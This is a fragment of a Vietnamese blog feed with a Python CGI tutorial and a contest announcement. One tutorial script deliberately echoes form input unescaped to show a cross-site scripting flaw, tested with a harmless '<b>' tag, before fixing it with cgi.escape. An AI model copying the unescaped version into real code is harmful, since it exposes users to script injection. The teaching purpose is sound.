&lt;li&gt;Thuộc tính &lt;strong&gt;action&lt;/strong&gt; xác định đường dẫn đến chương trình CGI sẽ xử lý mẫu đơn này. Nếu không xác định thì chính địa chỉ hiện tại sẽ được dùng.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Thẻ &lt;strong&gt;input&lt;/strong&gt; xác định một trường nhập. Thẻ này có các thuộc tính chính là &lt;strong&gt;type&lt;/strong&gt;, &lt;strong&gt;name&lt;/strong&gt;, và &lt;strong&gt;value&lt;/strong&gt;.&lt;ol class="arabic"&gt;
&lt;li&gt;Thuộc tính &lt;strong&gt;type&lt;/strong&gt; xác định kiểu nhập là một ô nhập (text box), một nút nhấn (button), một nút chọn (radio button), hoặc một tập tin (file). Ở ví dụ này chúng ta xác định một ô nhập với kiểu &lt;strong&gt;text&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Thuộc tính &lt;strong&gt;name&lt;/strong&gt; xác định khóa của bộ 2. Trong ví dụ này khóa nhập là &lt;strong&gt;number&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Thuộc tính &lt;strong&gt;value&lt;/strong&gt; xác định giá trị khởi đầu của trường nhập này. Chúng ta để trống.&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;Thẻ &lt;strong&gt;input&lt;/strong&gt; với thuộc tính &lt;strong&gt;type&lt;/strong&gt; là &lt;strong&gt;submit&lt;/strong&gt; sẽ tạo một nút nhấn. Nút nhấn này đặc biệt vì nó sẽ gửi các giá trị chúng ta nhập vào mẫu đơn đến chương trình CGI.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Thông tin chi tiết về các thẻ HTML có thể được xem thêm từ các tài liệu từ &lt;a class="reference external" href="http://www.w3c.org"&gt;W3C&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Chương trình này cũng chỉ là in ra một mẫu đơn nhưng chúng ta đã có thể nhấn nút để gửi mẫu đơn đó đi.&lt;/p&gt;
&lt;p&gt;Chúng ta sẽ sửa nó để in lại những gì đã nhận từ trình duyệt.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!c:/python26/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;cgi&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Content-Type: text/html&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;title&amp;gt;CGI form processing&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;fieldset&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;legend&amp;gt;Number guessing game&amp;lt;/legend&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;form method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;label for=&amp;quot;number&amp;quot;&amp;gt;Enter a number&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;number&amp;quot; value=&amp;quot;&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;input type=&amp;quot;submit&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;/fieldset&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cgi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FieldStorage&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;has_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;number&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;You have entered: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getfirst&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;number&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Điều đầu tiên chúng ta nhận ra là sự sử dụng mô-đun &lt;strong&gt;cgi&lt;/strong&gt;. Mô-đun này cho phép chúng ta tạo một đối tượng &lt;strong&gt;FieldStorage&lt;/strong&gt;. Đối tượng FieldStorage chứa các bộ 2 (khóa, giá trị) chúng ta nhận được từ trình duyệt trong một cấu trúc như kiểu từ điển. Do đó chúng ta có thể dùng phương thức &lt;strong&gt;has_key&lt;/strong&gt; để kiểm tra sự tồn tại của khóa tương ứng. Để lấy giá trị từ FieldStorage ta có thể dùng &lt;strong&gt;form['number'].value&lt;/strong&gt; hoặc gọi các hàm như &lt;strong&gt;getvalue&lt;/strong&gt;, &lt;strong&gt;getfirst&lt;/strong&gt;, hay &lt;strong&gt;getlist&lt;/strong&gt;. Các hàm này được đề cập đến một cách chi tiết trong bộ tài liệu sử dụng Python.&lt;/p&gt;
&lt;p&gt;Nếu tinh ý, chúng ta sẽ thấy rằng khi dữ liệu nhập chứa các thẻ HTML hợp lệ thì kết quả xuất ra sẽ hiển thị cả những thẻ HTML này. Ví dụ khi ta nhập &lt;strong&gt;Nguyễn &amp;lt;b&amp;gt;Việt&amp;lt;/b&amp;gt; Nam&lt;/strong&gt;.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/cgi/form2.png" /&gt;
&lt;p&gt;Điều này có thể là đúng theo ý định, hoặc cũng thể nằm ngoài mong muốn. Chúng ta gọi đây là các lỗi &lt;a class="reference external" href="http://www.owasp.org/index.php/Cross-site_Scripting_(XSS)"&gt;kịch bản chéo trang (Cross Site Scripting, XSS)&lt;/a&gt;. Cách khắc phục là trước khi hiển thị các chuỗi không nằm trong kiểm soát của chương trình (ví dụ như dữ liệu nhập, dữ liệu xuất từ hệ thống khác, v.v...), chúng ta sẽ cần chuyển mã các ký tự đặc biệt. Mô-đun &lt;tt class="docutils literal"&gt;cgi&lt;/tt&gt; cung cấp hàm &lt;strong&gt;escape&lt;/strong&gt; để làm việc này. Mã nguồn mới sẽ gói &lt;strong&gt;getfirst&lt;/strong&gt; trong &lt;strong&gt;cgi.escape&lt;/strong&gt; như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!c:/python26/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;cgi&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Content-Type: text/html&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;title&amp;gt;CGI form processing&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;fieldset&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;legend&amp;gt;Number guessing game&amp;lt;/legend&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;form method=&amp;quot;POST&amp;quot;&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;label for=&amp;quot;number&amp;quot;&amp;gt;Enter a number&amp;lt;/label&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;input type=&amp;quot;text&amp;quot; name=&amp;quot;number&amp;quot; value=&amp;quot;&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                              &amp;lt;input type=&amp;quot;submit&amp;quot; /&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                      &amp;lt;/form&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;/fieldset&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

&lt;span class="n"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cgi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;FieldStorage&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;has_key&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;number&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
      &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;You have entered: &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;cgi&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;escape&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt; \
                      &lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;getfirst&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;number&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Giờ đây, chuỗi được xuất ra sẽ giống hệt với chuỗi nhập.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/cgi/form3.png" /&gt;
&lt;p&gt;Chúng ta cũng có thể thử với phương thức GET bằng cách nhập thẳng URL &lt;strong&gt;http://localhost/cgi-bin/fp.py?number=Nguyễn+&amp;lt;b&amp;gt;Việt&amp;lt;/b&amp;gt;+Nam&lt;/strong&gt;. Chúng ta cũng sẽ nhận được kết quả tương tự.&lt;/p&gt;
&lt;p&gt;Vậy là qua hai phần chúng ta đã tìm hiểu về cách hoạt động của một chương trình CGI. Điểm mạnh của giao thức CGI là tính đơn giản và an toàn cao vì mỗi yêu cầu được một tiến trình riêng xử lý. Cũng chính vì mô hình đơn giản như vậy nên CGI gặp phải nhiều cản trở trong việc phát triển. Cản trở đầu tiên là chương trình CGI phải tự xử lý trạng thái giữa các yêu cầu kế tiếp nhau, hay còn gọi là phiên làm việc (session). Cản trở thứ hai là chương trình CGI sẽ phải được thiết kế đặc biệt nếu muốn sử dụng các biến có phạm vi toàn ứng dụng (application scope). Cuối cùng, chương trình CGI chạy chậm hơn và tốn tài nguyên hơn vì mỗi yêu cầu phải được xử lý riêng.&lt;/p&gt;
&lt;p&gt;Trong các phần tới, chúng ta sẽ xem qua cách hoạt động của những công nghệ tiên tiến, giải quyết được các điểm yếu của giao thức CGI.&lt;/p&gt;
</content><category term="cgi"></category><category term="web"></category><category term="security"></category><category term="http method"></category><category term="form"></category></entry><entry><title>Trao giải cuộc thi lập trình game bằng Python</title><link href="/2010/02/trao-giai-cuoc-thi-lap-trinh-game-bang-python.html" rel="alternate"></link><published>2010-02-05T03:56:00+07:00</published><updated>2010-02-05T03:56:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-02-05:/2010/02/trao-giai-cuoc-thi-lap-trinh-game-bang-python.html</id><summary type="html">&lt;p&gt;Ngày 04 tháng 02 năm 2009, nhóm PCNV đã trao giải cuộc thi lập trình game với ngôn ngữ Python cho bạn &lt;strong&gt;Hoàng Quốc Thịnh&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Cuộc thi lập trình game với ngôn ngữ Python là một trong những hoạt động của nhóm PCNV nhằm lôi cuốn sự tham gia tìm …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Ngày 04 tháng 02 năm 2009, nhóm PCNV đã trao giải cuộc thi lập trình game với ngôn ngữ Python cho bạn &lt;strong&gt;Hoàng Quốc Thịnh&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Cuộc thi lập trình game với ngôn ngữ Python là một trong những hoạt động của nhóm PCNV nhằm lôi cuốn sự tham gia tìm hiểu và khuyến khích sáng tạo trong việc sử dụng ngôn ngữ Python.&lt;/p&gt;
&lt;p&gt;Ngôn ngữ Python là một ngôn ngữ mạnh, đơn giản, và tổng quát. Ngoài việc được sử dụng trong các tổ chức lớn như Google, và NASA, Python còn được dùng để viết nên những trò chơi như EVE-Online với cả triệu người chơi, hay &lt;strong&gt;Ruồi Yêu Cứt&lt;/strong&gt; với giải thưởng lập trình game bằng Python đầu tiên.&lt;/p&gt;
&lt;p&gt;Xin chúc mừng bạn Hoàng Quốc Thịnh.&lt;/p&gt;
&lt;p&gt;Hình bên dưới là bạn Nguyễn Thành Nam đại diện nhóm PCNV đang trao giải cho bạn Hoàng Quốc Thịnh trong bữa ăn thân mật. Hình chụp bởi nhiếp ảnh gia Thành Nguyễn (Malaysia) và sửa đôi chút bởi nhiếp ảnh gia Nguyễn Duy Thọ.&lt;/p&gt;
&lt;img alt="" src="/static/game_programming_contest_prize.png" /&gt;
</content><category term="game"></category><category term="prize"></category><category term="contest"></category></entry><entry><title>Lập trình web với Python (3)</title><link href="/2010/01/lap-trinh-web-voi-python-3.html" rel="alternate"></link><published>2010-01-28T09:52:00+07:00</published><updated>2010-01-28T09:52:00+07:00</updated><author><name>Nguyễn Thành Nam</name></author><id>tag:None,2010-01-28:/2010/01/lap-trinh-web-voi-python-3.html</id><summary type="html">&lt;p&gt;Sau khi đã cài đặt máy chủ web, và Python ở hai bài trước, trong bài này chúng ta sẽ bước vào thế giới lập trình web với mô hình đơn giản nhất, mô hình CGI.&lt;/p&gt;
&lt;p&gt;CGI là viết tắt của Common Gateway Interface, dịch chính xác là giao tiếp …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Sau khi đã cài đặt máy chủ web, và Python ở hai bài trước, trong bài này chúng ta sẽ bước vào thế giới lập trình web với mô hình đơn giản nhất, mô hình CGI.&lt;/p&gt;
&lt;p&gt;CGI là viết tắt của Common Gateway Interface, dịch chính xác là giao tiếp cổng chung. Giao thức này được sinh ra để chuẩn hóa (hay xác định rõ) cách thức một máy chủ web giao phó việc tạo trang web cho các ứng dụng console (các ứng dụng nhận dữ liệu từ bộ nhập chuẩn và xuất ra bộ xuất chuẩn). Các ứng dụng này được gọi là các ứng dụng CGI, hay kịch bản CGI vì chúng thường được viết bằng ngôn ngữ kịch bản, mặc dù chúng cũng có thể được viết bằng các ngôn ngữ khác như C, Java.&lt;/p&gt;
&lt;div class="section" id="mo-hinh-hoat-dong"&gt;
&lt;h2&gt;Mô hình hoạt động&lt;/h2&gt;
&lt;p&gt;Thông thường, một máy chủ web nhận yêu cầu từ máy khách và tìm kiếm trên hệ thống xem có tập tin mà máy khách cần truy xuất hay không. Nếu có thì máy chủ web sẽ xuất nội dung của tập tin này cho máy khách.&lt;/p&gt;
&lt;p&gt;Trong giao thức CGI, máy chủ web nhận yêu cầu từ máy khách, tìm kiếm trên hệ thống xem có ứng dụng CGI đó không. Nếu có thì máy chủ web sẽ thực thi ứng dụng CGI, chuyển toàn bộ yêu cầu đến ứng dụng thông qua các biến môi trường và bộ nhập chuẩn. Ứng dụng CGI sẽ xử lý yêu cầu rồi gửi trả thông tin cho máy chủ web qua bộ xuất chuẩn. Máy chủ web sẽ nhận thông tin từ bộ xuất chuẩn của ứng dụng CGI để xuất trả lại cho máy khách. Mô hình hoạt động của giao thức CGI được miêu tả trong hình sau.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/cgi/cgi-model.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="hello-world"&gt;
&lt;h2&gt;Hello World&lt;/h2&gt;
&lt;p&gt;Để hiểu rõ hơn cách hoạt động, chúng ta sẽ tạo một tập tin &lt;strong&gt;helloworld.py&lt;/strong&gt; trong thư mục &lt;strong&gt;C:\Program Files\Apache Software Foundation\Apache2.2\cgi-bin&lt;/strong&gt; với nội dung như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!c:/python26/python&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Content-Type: text/html&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Hello world.&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trước khi giải thích từng dòng lệnh, chúng ta sẽ xem xem kết quả đạt được là gì. Chúng ta sẽ dùng trình duyệt để vào trang &lt;strong&gt;http://localhost/cgi-bin/helloworld.py&lt;/strong&gt;. Dĩ nhiên chúng ta cũng phải đảm bảo rằng máy chủ Apache đang chạy. Và đây là hình mà chúng ta nhận được.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/cgi/helloworld.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="cac-yeu-to-chinh-cua-chuong-trinh-cgi"&gt;
&lt;h2&gt;Các yếu tố chính của chương trình CGI&lt;/h2&gt;
&lt;p&gt;Như thế, chương trình CGI đầu tiên đã thực thi hoàn chỉnh. Hãy quay lại xem các yếu tố căn bản của một chương trình CGI viết bằng ngôn ngữ Python.&lt;/p&gt;
&lt;p&gt;Dòng đầu tiên được gọi là dòng &lt;strong&gt;shebang&lt;/strong&gt; với hai ký tự đặc biệt &lt;strong&gt;#!&lt;/strong&gt;. Phần đi ngay sau hai ký tự này là đường dẫn tuyệt đối đến trình thông dịch Python trên hệ thống. Dòng này nói cho máy chủ web biết rằng tập tin này cần được đọc bởi trình thông dịch Python.&lt;/p&gt;
&lt;p&gt;Dòng lệnh &lt;tt class="docutils literal"&gt;print&lt;/tt&gt; thứ nhất cung cấp một đầu mục (header) cho máy chủ web. Đầu mục này là &lt;strong&gt;Content-Type&lt;/strong&gt; với nội dung là &lt;strong&gt;text/html&lt;/strong&gt;. Đây là đầu mục bắt buộc trong giao thức HTTP, do đó các ứng dụng CGI thông thường phải cung cấp đầu mục này.&lt;/p&gt;
&lt;p&gt;Dòng lệnh in thứ hai (in ra một dòng trống) báo hiệu sự kết thúc của các đầu mục, và những gì theo sau sẽ là dữ liệu nội dung. Dòng lệnh này là bắt buộc.&lt;/p&gt;
&lt;p&gt;Dòng lệnh in thứ ba xuất nội dung chính, là chuỗi &lt;strong&gt;Hello world.&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Các dòng lệnh này là những yếu tố chính cấu tạo nên một chương trình CGI viết bằng ngôn ngữ Python. Điểm quan trọng nhất mà chúng ta cần lưu ý là việc xuất dữ liệu thông qua bộ xuất chuẩn (stdout), và định dạng của dữ liệu cần xuất (đầu mục, dòng trống, nội dung).&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="them-vao-cac-the-html"&gt;
&lt;h2&gt;Thêm vào các thẻ HTML&lt;/h2&gt;
&lt;p&gt;Chương trình của chúng ta khá buồn tẻ vì chúng ta khai báo &lt;strong&gt;Content-Type&lt;/strong&gt; là &lt;strong&gt;text/html&lt;/strong&gt; nhưng chúng ta không dùng thẻ HTML. Chúng ta hãy sửa lại chương trình như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!c:/python26/python&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Content-Type: text/html&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;title&amp;gt;Python!&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;font size=&amp;quot;+3&amp;quot;&amp;gt;H&amp;lt;/font&amp;gt;ello &amp;lt;font color=&amp;quot;red&amp;quot;&amp;gt;HTML&amp;lt;/font&amp;gt;.&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/html&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Quay lại trình duyệt và làm tươi (F5, hay Ctrl-R), chúng ta sẽ thấy hình như sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/cgi/hellohtml.png" /&gt;
&lt;/div&gt;
&lt;div class="section" id="content-type-la-quan-trong"&gt;
&lt;h2&gt;Content-Type là quan trọng&lt;/h2&gt;
&lt;p&gt;Những gì chúng ta vừa thực hiện là thay đổi nội dung mà chúng ta xuất ra bộ xuất chuẩn.&lt;/p&gt;
&lt;p&gt;Bây giờ, giữ cùng nội dung đấy, nhưng chúng ta thay đổi đầu mục &lt;strong&gt;Content-Type&lt;/strong&gt; thành &lt;strong&gt;text/plain&lt;/strong&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!c:/python26/python&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Content-Type: text/plain&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;title&amp;gt;Python!&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;font size=&amp;quot;+3&amp;quot;&amp;gt;H&amp;lt;/font&amp;gt;ello &amp;lt;font color=&amp;quot;red&amp;quot;&amp;gt;HTML&amp;lt;/font&amp;gt;.&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/html&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Thử xem trang này với các trình duyệt &lt;strong&gt;chuẩn&lt;/strong&gt; ví dụ Opera, hoặc Firefox thì chúng ta sẽ nhận được hình tương tự như sau:&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/cgi/hellohtmlplain.png" /&gt;
&lt;p&gt;Thay vì xử lý những thẻ HTML một cách đặc biệt thì trình duyệt đã không làm như vậy. Và đây là cách làm đúng bởi vì chúng ta nói cho trình duyệt biết rằng nội dung của chúng ta là ở dạng văn bản thường (plaintext) thông qua đầu mục &lt;strong&gt;Content-Type&lt;/strong&gt; như trên. Trình duyệt IE không tuân theo chuẩn HTTP một cách triệt để nên vẫn sẽ hiển thị nội dung của chúng ta dưới dạng một trang HTML.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="mot-it-du-lieu-dong"&gt;
&lt;h2&gt;Một ít dữ liệu động&lt;/h2&gt;
&lt;p&gt;Mục đích của chương trình CGI là xử lý và xuất dữ liệu nên sẽ là vô ích nếu chương trình CGI của chúng ta chỉ xuất các trang web tĩnh. Chúng ta sẽ sửa lại chương trình một chút như sau:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!c:/python26/python&lt;/span&gt;

&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;random&lt;/span&gt;

&lt;span class="n"&gt;actions&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;rocks&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;rules&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;kicks butt&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;constricts camel&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Content-Type: text/html&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&amp;quot;&amp;quot;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              &amp;lt;title&amp;gt;Python!&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/head&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;              Python &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;.&lt;/span&gt;
&lt;span class="s2"&gt;      &amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;&amp;lt;/html&amp;gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;choice&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;actions&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Trong chương trình này, chúng ta sử dụng mô-đun &lt;strong&gt;random&lt;/strong&gt; và hàm &lt;strong&gt;choice&lt;/strong&gt; để chọn một hành động ngẫu nhiên. Khi làm tươi trình duyệt, chúng ta có thể gặp các hình tương tự như sau.&lt;/p&gt;
&lt;img alt="" src="/static/web-programming/cgi/dynamic1.png" /&gt;
&lt;img alt="" src="/static/web-programming/cgi/dynamic2.png" /&gt;
